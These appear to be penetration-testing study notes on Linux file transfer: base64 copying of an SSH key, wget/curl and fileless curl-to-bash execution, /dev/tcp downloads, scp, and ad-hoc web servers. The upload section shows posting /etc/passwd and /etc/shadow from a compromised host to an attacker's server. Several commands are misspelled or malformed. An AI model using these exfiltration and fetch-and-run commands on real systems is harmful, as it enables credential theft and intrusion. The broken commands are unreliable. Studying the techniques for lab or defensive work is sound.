### Linux File Transfer Methods

#### Importance of File Transfer Knowledge

- Linux offers a variety of tools for file transfers.
    
- Understanding these methods improves both offensive and defensive cybersecurity skills.
    

#### Real-World Incident Response Example

- **Scenario:** Incident response on web servers revealed multiple threat actors in 6/9 servers.
    
- **Vulnerability:** Exploited SQL Injection to execute a malicious Bash script.
    
- **Malicious Actions:**
    
    - Downloaded malware connecting to a command and control (C2) server.
        
    - Used three methods for downloading malware:
        
        1. **cURL**
            
        2. **wget**
            
        3. **Python**
            
    - All methods communicated over HTTP.
        

#### Key Points on Malware Communication

- While Linux supports protocols like FTP and SMB, most malware relies on **HTTP/HTTPS**.
    
- Malware often leverages common Linux tools for file transfers due to their ubiquity.
    

#### File Transfer Methods to Review

- **HTTP**
    
- **Bash Scripts**
    
- **SSH**
    
- Additional tools and protocols will be covered in this section.

#### Download Operations
We have access to the machine `NIX04` and we need to downlaod a file from our Pwnbox machine. let's see how we can accomplish this using multiple file download methods.
![Download Operations](/Assets/attachments/LinuxDownloadUpload.png)

## Base64 Encodoing/Decoding
Depending on the file size we wnat to transfer, we can use a method that does not require network communication. if we have access to a terminal, we can encode a file to a base64 string, copying its content into the terminal and perfom the reverse operation. Let's see how we can do this with Bash.

**Pwnbox-Check File MD5 hash**
```bash
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
We use `cat` to print the file content, and base64 encode the output using a pipe |. We used the option `-w 0` to crate only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.
**Pwnbox - Encode SSH Key to Base64**
```bash
cat id_rsa | base64 -w 0; echo
```
We copy this content, pase it onto our Linux target machine, and use `base64` with the option `-d` to decode it.

**Line - Decode the File**
```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnph.....' | base64 -d > id_rsa
```
Finally, we ca nconfirm if the file was tranferred successfully using the `md5sum` command.

**Linux - Confirm the MD5 Hashes Match**
```bash
md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

## Web Downloads with Wget and cURL
Two of the most common utilities in LInux distributions to interact with we application are `wget` and `crul`.
These tools are installed on many Linux distributions.
to downlaod a file using `wget`, we need to specify the URL and the option (UPPERCASE O)`-O` to set the output filename.
#### Dwonload File Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/Linenum.sh -O /tmp/LinEnum.sh
```
`cURL` is very similar ot `wget`, but the output filename option is lwercase `-o`
#### Download a File Using cURL
```bash
crul -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless Attacks Using Linux
- #### Understanding Fileless Operations

- **Definition:** Fileless operations execute commands or payloads directly in memory without saving files to disk.
    
- **Mechanism:** Pipes in Linux enable chaining commands and transferring data without storing it on disk.
    
    - Example: 
    ```bash 
    echo 'payload' | bash
    ```
        

#### Tools and Techniques

- Common Linux tools supporting fileless operations:
    
    - **cURL** and **wget**: Fetch and execute payloads directly.
        
    - **Python/Perl/Ruby**: Execute inline scripts using interpreters.
        
    - **Bash scripts**: Combine commands to avoid disk writes.
        

#### Caveats and Considerations

- **Temporary Files:**
    
    - Some payloads, like those using `mkfifo`, may create temporary files or artifacts.
        
    - Execution may appear fileless, but traces could remain on the system.
        
- **Persistence Mechanisms:**
    
    - Fileless does not imply stealth if temporary or residual files are created.
        
    - Monitor processes and memory for signs of malicious activity.
        

#### Benefits and Risks

- **Advantages:**
    
    - Increased stealth for attackers by avoiding direct file creation.
        
    - Useful for quick in-memory execution during penetration tests.
        
- **Risks:**
    
    - Can still leave detectable artifacts depending on the method used.
        
    - May complicate incident response and forensics.

#### Examples of Fileless Execution
- **Fileless Download with cURL**

    Let's take the cURL command we used, and instead of downloading the LinEnum.sh, let's execute it directly using a pipe.
    ```bash
    crul https://raw.githubusercontent.com/LinEnum/master/LinEnum.sh | bash
    ```

- **Fileless Download with wget**
    ```bash
    wget -qO- https://example.com/script.py | python3
    ```
### **Use Cases**

1. **Quick Setup Scripts**
    
    - Automate the installation of software or configuration tasks.
    - Commonly used for installing utilities, frameworks, or environments (e.g., Node.js via `nvm`, Docker installation scripts).
    - Example:
    ```bash
    curl -fsSL https://get.docker.com | bash
    ```
        
2. **Testing Environments**
    
    - Quickly deploy or test a script without saving it locally.
    - Useful for non-critical, throwaway environments like virtual machines or containers.
3. **Bootstrapping**
    
    - Automating the initial setup of a system with dependencies and configurations.
    - Example: Setting up cloud instances with pre-configured scripts.
4. **Remote Management**
    
    - Running commands or tasks on systems where you don’t need to save the script locally.
5. **Educational Demonstrations**
    
    - Providing users with an easy one-liner to test or learn a concept.
    - Example:
    ```bash
    curl http://example.com/demo.sh | bash
    ```
        

---

### **Risks and Considerations**

1. **Security Risks**
    
    - **Code Injection**: The script can be altered on the server to include malicious commands.
    - **Man-in-the-Middle Attacks**: If `http://` is used instead of `https://`, attackers can intercept and modify the script.
2. **No Validation**
    
    - The script is executed directly without being inspected by the user. This is inherently risky.
3. **Untrusted Sources**
    
    - Running a script from an unknown or unverified source can compromise the system.
4. **Loss of Control**
    
    - The script might modify system files, install backdoors, or perform other unintended actions.

---

### **Best Practices**

1. **Always Use HTTPS**
    
    - Ensure the source is served over HTTPS to prevent tampering.
2. **Inspect the Script**
    
    - Download the script first and review its content before execution:
        ```bash
        curl -O http://example.com/bash.sh less bash.sh  # Inspect the script bash bash.sh  # Run only if safe
        ```
        
3. **Use Signing or Hash Verification**
    
    - Verify the script using a checksum or GPG signature provided by the source.
4. **Use Minimal Privileges**
    
    - Avoid running the script as root unless necessary.
5. **Sandbox Testing**
    
    - Test the script in a virtual machine or container before running it on production systems.

---

### Summary

The `curl http://example.com/bash.sh | bash` approach is convenient but risky. It should only be used with trusted sources and proper security measures in place. A safer alternative is to download and inspect the script first before execution.
#### Key Takeaway

- Leverage fileless methods for stealthy operations, but understand their limitations and the potential for residual artifacts.

## Download with Bash (/dev/tcp)
- In situations where no well-known file transfer tools (e.g., `wget`, `curl`, `scp`) are available, Bash itself can be used to transfer files.
- This method relies on the `/dev/TCP` device file, which is supported if Bash version **2.04** or greater is installed and compiled with the `--enable-net-redirections` option.

#### Requirements

1. Bash version **2.04** or later.
2. Bash must be compiled with `--enable-net-redirections`.

#### Using `/dev/TCP` for File Downloads

- The `/dev/TCP` file allows Bash to make raw network connections for sending or receiving data.
- Example: Downloading a file using `/dev/TCP`.

```bash
exec 3<> /dev/tcp/<server>/<port>
echo -e "GET /path/to/file HTTP/1.1\r\nHost: <server>\r\nConnection: close\r\n\r\n" >&3 cat <&3 > downloaded_file
exec 3>&
```
#### Connect to the Target Webserver
```bash
exec 3>?/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\\n">&3
```

#### Print the Response
```bash
cat <&3
```

**Explanation:**

- `exec 3<> /dev/tcp/<server>/<port>`: Opens a connection to the specified server and port.
- `echo`: Sends an HTTP GET request to the server.
- `cat <&3 > downloaded_file`: Reads the response from the server and saves it as a file.
- `exec 3>&-`: Closes the file descriptor.

#### Limitations

1. No support for HTTPS (without additional tools).
2. Requires understanding of raw protocols (e.g., crafting HTTP requests manually).
3. May not work if `--enable-net-redirections` is not enabled in Bash.

#### Use Cases

- Minimalist environments where file transfer tools are not available.
- Quick and simple file transfer on systems with limited resources.

This method provides a lightweight and powerful alternative when traditional file transfer utilities are unavailable.

## SSH Downloads
SSH or (Secure Shell) is a protocol that allows secure access to remote coputers. SSH implementation comes with an `scp` utility for remtoe file transfer that, by default, uses the SSH protocol.
`SCP` secure copy is a command -line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.
`SCP` is very similar to `copy` or `cp` but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
#### Setting up the SSH server
```bash
sudo systemctl enable ssh
```
#### Starting the SSH Server
```bash
sudo systemctl start ssh
```
#### Checking for SSH Listening Port
```bash
netstat -lnpt

$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
```
Now we can begin transferring files. We need to specify the following. 
- IP
- Username
- Password
#### Linux Downloaing File Using SCP
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```
**Note**: You can create a temporary user account for file transfer and avoid using the primary credentials or keys on a remote computer.

## MacOS SSH turn ON or OFF
```bash
# check status
sudo systemsetup -getremotelogin

## Turn on or off
sudo systemsetup -setremotelogin on
sudo systemsetup -setremotelogin off
```

## Upload Operations
There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uplaods. Let's see how we can upload files in various ways.

## Web Uploads
We can use `uploadserver` an extended module of the Python `HTTP.Server` module, which includes a file upload page.
#### Install `uploadserver
```bash
sudo python3 -m pip install --user uploadserver
```
## Create a SElf-Signed Certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
### Command Breakdown:

1. **`openssl req`**:
    
    - This invokes the `req` (Certificate Request) command, used to generate X.509 certificate requests or self-signed certificates.
2. **`-x509`**:
    
    - Tells OpenSSL to output a self-signed X.509 certificate instead of a certificate signing request (CSR).
    - X.509 is the standard format for public key certificates.
3. **`-out server.pem`**:
    
    - Specifies the name of the file where the generated certificate will be saved (`server.pem`).
4. **`-keyout server.pem`**:
    
    - Specifies the file where the private key will be saved. In this case, both the private key and the certificate are saved in the same file (`server.pem`).
5. **`-newkey rsa:2048`**:
    
    - Tells OpenSSL to generate a new private key and a corresponding certificate.
    - `rsa:2048` specifies that the private key should use the RSA algorithm with a key size of 2048 bits.
6. **`-nodes`**:
    
    - Stands for "No DES encryption."
    - Ensures that the private key is not encrypted with a passphrase. This is useful in automated environments where entering a password interactively is not feasible.
7. **`-sha256`**:
    
    - Specifies the hashing algorithm to use for the certificate's signature. SHA-256 is a secure and widely used hashing algorithm.
8. **`-subj '/CN=server'`**:
    
    - Provides the subject information for the certificate in a single string.
    - `/CN=server` sets the **Common Name (CN)** field of the certificate to "server."
    - Common Name typically represents the domain name or identifier for which the certificate is issued.

---

### Purpose:

This command generates:

1. A **self-signed certificate** that can be used to establish HTTPS or other secure communications for a server.
2. A **private key** paired with the certificate, stored in the same file (`server.pem`).

This is particularly useful for testing, internal services, or when you don't need a certificate signed by a trusted Certificate Authority (CA).

### Example Usage:

- **For Testing**: Use this self-signed certificate in a local or development environment to set up HTTPS for a server.
- **Simple TLS Servers**: Use it for internal services or quick setups where security doesn't depend on being trusted by external clients.

### Output:

The resulting file, `server.pem`, contains both the **private key** and the **self-signed certificate**. You can inspect the contents using:
```bash
openssl x509 -in server.pem -text -noout
```

or to view the private key:
```bash
openssl rsa -in server.pem -check
```
#### Start a Web Server
```bash
mkdir https && cd https
sudo python3 -m uuploadserver 443 --server-certificate ~/server.pem
```
Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
```bash
curl -X POST https://192.168.0.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
WE sued the option `--insecure` becase we used a self-signed certificate that we trust.
## Alternative Wev File Transfer Methods
Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward.
```bash
python3 -m http.server
```
#### Creating a Web Server with Python2/7
```bash
python2.7 -m http.server
```
#### Creating a Web Server with PHP
```bash
php -S 0.0.0.0:8000
```
Creating a Web Server with Ruby
```bash
ruby -run -ehttpd . -p8000
```
#### Download the File from the Target Machine onto the Pwnbox
```bash
wget 192.168.0.113:8000/filetotransfer.txt
```
**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

## CSP Upload
Some companies allow `SSH protocol`(TCP/22) for outbound connections, and if that's the case we can use an SSH server with the `scp` utility to upload file.
#### upload file using SCP
```bash
scp /etc/passwd http-student@<ip>:/home/htp-student/
```
Note: Remember that scp syntax is similar to cp or copy.

## Onwards
These are the most common file transfer methods using built-in tools on Linux systems, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.

